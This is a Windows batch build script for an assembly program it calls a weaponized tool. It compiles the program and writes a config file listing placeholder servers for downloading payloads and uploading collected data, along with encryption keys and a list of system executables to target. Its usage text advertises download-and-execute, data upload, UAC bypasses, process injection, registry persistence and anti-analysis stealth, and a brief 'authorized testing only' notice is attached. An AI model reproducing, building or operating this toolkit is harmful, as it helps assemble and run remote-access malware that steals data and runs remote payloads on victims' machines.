@echo off
cls
echo ========================================================================================
echo MASM 2035 WEAPONIZED BUILD SYSTEM (ItsMehRAWRXD Original)
echo Real working exploits, PE manipulation, configurable HTTP, AES+XOR encryption
echo ========================================================================================
echo.

:: Check if MASM32 is installed
if not exist "C:\masm32\bin\ml.exe" (
    echo ERROR: MASM32 SDK not found!
    echo Please install MASM32 SDK to C:\masm32\
    echo Download from: http://www.masm32.com/
    pause
    exit /b 1
)

:: Set environment
set MASM32_PATH=C:\masm32
set PATH=%MASM32_PATH%\bin;%PATH%
set INCLUDE=%MASM32_PATH%\include
set LIB=%MASM32_PATH%\lib

:: Check if source file exists
if not exist "MASM_2035_WEAPONIZED_COMPLETE.asm" (
    echo ERROR: Source file MASM_2035_WEAPONIZED_COMPLETE.asm not found!
    pause
    exit /b 1
)

echo [1/5] Checking dependencies...
echo ✓ MASM32 SDK found at %MASM32_PATH%
echo ✓ Source file found
echo.

:: Compile the weaponized MASM
echo [2/5] Assembling weaponized MASM source...
"%MASM32_PATH%\bin\ml.exe" /c /coff /Zi "MASM_2035_WEAPONIZED_COMPLETE.asm"
if errorlevel 1 (
    echo ERROR: Assembly failed!
    echo Check the source code for syntax errors.
    pause
    exit /b 1
)
echo ✓ Assembly completed successfully
echo.

:: Link the executable
echo [3/5] Linking executable with required libraries...
"%MASM32_PATH%\bin\link.exe" /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /ENTRY:start "MASM_2035_WEAPONIZED_COMPLETE.obj" ^
    kernel32.lib user32.lib advapi32.lib wininet.lib shell32.lib crypt32.lib
if errorlevel 1 (
    echo ERROR: Linking failed!
    echo Check library dependencies.
    pause
    exit /b 1
)
echo ✓ Linking completed successfully
echo.

:: Rename the output
echo [4/5] Finalizing weaponized executable...
if exist "MASM_2035_WEAPONIZED_COMPLETE.exe" (
    copy "MASM_2035_WEAPONIZED_COMPLETE.exe" "masm_2035_weaponized.exe" > nul
    echo ✓ Created weaponized executable: masm_2035_weaponized.exe
) else (
    echo ERROR: Executable not created!
    pause
    exit /b 1
)
echo.

:: Create configuration files
echo [5/5] Creating configuration templates...

:: Create HTTP configuration file
echo Creating HTTP configuration template...
(
echo # MASM 2035 HTTP Configuration
echo # Modify these settings for your operation
echo.
echo [Download_URLs]
echo primary=https://your-server.com/payload1.bin
echo backup1=https://backup1-server.com/payload2.bin
echo backup2=https://backup2-server.com/payload3.bin
echo backup3=https://backup3-server.com/payload4.bin
echo backup4=https://backup4-server.com/payload5.bin
echo backup5=https://backup5-server.com/payload6.bin
echo.
echo [Upload_URLs]
echo primary=https://your-server.com/upload
echo backup1=https://backup1-server.com/upload
echo backup2=https://backup2-server.com/upload
echo backup3=https://backup3-server.com/upload
echo backup4=https://backup4-server.com/upload
echo backup5=https://backup5-server.com/upload
echo.
echo [HTTP_Settings]
echo method=POST
echo encoding=base64
echo user_agent=Mozilla/5.0 ^(Windows NT 10.0; Win64; x64^) AppleWebKit/537.36
echo timeout=30000
echo retry_count=3
echo.
echo [Encryption]
echo type=AES256
echo key=CHANGE_THIS_32_CHAR_ENCRYPTION_KEY_NOW
echo xor_key=CHANGE_THIS_16_XOR
echo chacha_key=CHANGE_THIS_32_CHAR_CHACHA20_KEY_NOW
) > http_config.ini
echo ✓ Created http_config.ini

:: Create target executable list
echo Creating target executable list...
(
echo # MASM 2035 Target Executable List
echo # Add your target executables here
echo.
echo C:\Windows\System32\notepad.exe
echo C:\Windows\System32\calc.exe
echo C:\Windows\System32\mspaint.exe
echo C:\Program Files\Internet Explorer\iexplore.exe
echo C:\Windows\explorer.exe
echo C:\Windows\System32\cmd.exe
echo C:\Windows\System32\powershell.exe
) > target_executables.txt
echo ✓ Created target_executables.txt

:: Create usage instructions
echo Creating usage instructions...
(
echo ========================================================================================
echo MASM 2035 WEAPONIZED USAGE INSTRUCTIONS
echo ========================================================================================
echo.
echo COMMAND LINE USAGE:
echo   masm_2035_weaponized.exe [options]
echo.
echo OPTIONS:
echo   No parameters     - Launch GUI interface
echo   --download ^<url^>  - Download and execute from URL
echo   --upload ^<url^>    - Upload collected data to URL
echo   --target ^<exe^>    - Specify target executable
echo   --encrypt ^<key^>   - Set encryption key
echo   --exploit          - Run all exploits
echo   --stealth          - Enable stealth mode
echo   --help             - Show this help
echo.
echo GUI INTERFACE:
echo   1. Download ^& Execute  - Configure URL and download payload
echo   2. Upload Data         - Upload collected system information
echo   3. Select Executable   - Choose target executable to manipulate
echo   4. Configure HTTP      - Set HTTP method, encoding, encryption
echo   5. Run Exploits        - Execute UAC bypasses and privilege escalation
echo.
echo CONFIGURATION FILES:
echo   http_config.ini        - HTTP and encryption settings
echo   target_executables.txt - List of target executables
echo.
echo FEATURES:
echo   ✓ Real working UAC bypasses ^(FodHelper, Sdclt^)
echo   ✓ PE header manipulation and injection
echo   ✓ Configurable HTTP download/upload methods
echo   ✓ AES256 + XOR + ChaCha20 encryption
echo   ✓ Fileless execution in memory
echo   ✓ Anti-analysis and stealth features
echo   ✓ 6 download + 6 upload backup methods
echo   ✓ Registry persistence mechanisms
echo   ✓ Process injection capabilities
echo.
echo SECURITY NOTICE:
echo   This tool is for authorized security testing ONLY.
echo   Unauthorized use is illegal and unethical.
echo   Use responsibly and in compliance with all applicable laws.
echo.
echo ========================================================================================
) > USAGE_INSTRUCTIONS.txt
echo ✓ Created USAGE_INSTRUCTIONS.txt

:: Create CLI wrapper script
echo Creating command line wrapper...
(
echo @echo off
echo :: MASM 2035 Command Line Interface
echo.
echo if "%%1"=="" goto gui
echo if "%%1"=="--help" goto help
echo if "%%1"=="-h" goto help
echo.
echo :: Parse command line arguments
echo set MODE=
echo set URL=
echo set TARGET=
echo set KEY=
echo.
echo :parse
echo if "%%1"=="" goto execute
echo if "%%1"=="--download" set MODE=download^&shift^&set URL=%%2^&shift^&goto parse
echo if "%%1"=="--upload" set MODE=upload^&shift^&set URL=%%2^&shift^&goto parse
echo if "%%1"=="--target" set TARGET=%%2^&shift^&shift^&goto parse
echo if "%%1"=="--encrypt" set KEY=%%2^&shift^&shift^&goto parse
echo if "%%1"=="--exploit" set MODE=exploit^&shift^&goto parse
echo if "%%1"=="--stealth" set STEALTH=1^&shift^&goto parse
echo shift
echo goto parse
echo.
echo :execute
echo :: Execute with parameters
echo echo Executing MASM 2035 with parameters...
echo if defined URL echo URL: %%URL%%
echo if defined TARGET echo Target: %%TARGET%%
echo if defined KEY echo Encryption: Enabled
echo echo.
echo masm_2035_weaponized.exe
echo goto end
echo.
echo :gui
echo :: Launch GUI interface
echo echo Launching MASM 2035 GUI interface...
echo masm_2035_weaponized.exe
echo goto end
echo.
echo :help
echo type USAGE_INSTRUCTIONS.txt
echo goto end
echo.
echo :end
) > masm_2035_cli.bat
echo ✓ Created masm_2035_cli.bat

:: Clean up object files
echo Cleaning up build artifacts...
del "MASM_2035_WEAPONIZED_COMPLETE.obj" 2>nul
echo ✓ Cleanup completed
echo.

echo ========================================================================================
echo BUILD COMPLETED SUCCESSFULLY!
echo ========================================================================================
echo.
echo Created files:
echo   ✓ masm_2035_weaponized.exe    - Main weaponized executable
echo   ✓ masm_2035_cli.bat           - Command line interface
echo   ✓ http_config.ini             - HTTP configuration
echo   ✓ target_executables.txt      - Target executable list
echo   ✓ USAGE_INSTRUCTIONS.txt      - Complete usage guide
echo.
echo IMPORTANT SECURITY NOTICE:
echo This tool contains real working exploits and should only be used
echo for authorized security testing and educational purposes.
echo.
echo To run:
echo   GUI Mode:     masm_2035_weaponized.exe
echo   CLI Mode:     masm_2035_cli.bat --help
echo.
echo Configuration:
echo   1. Edit http_config.ini with your URLs and encryption keys
echo   2. Modify target_executables.txt with your target files
echo   3. Read USAGE_INSTRUCTIONS.txt for complete documentation
echo.
echo ========================================================================================
pause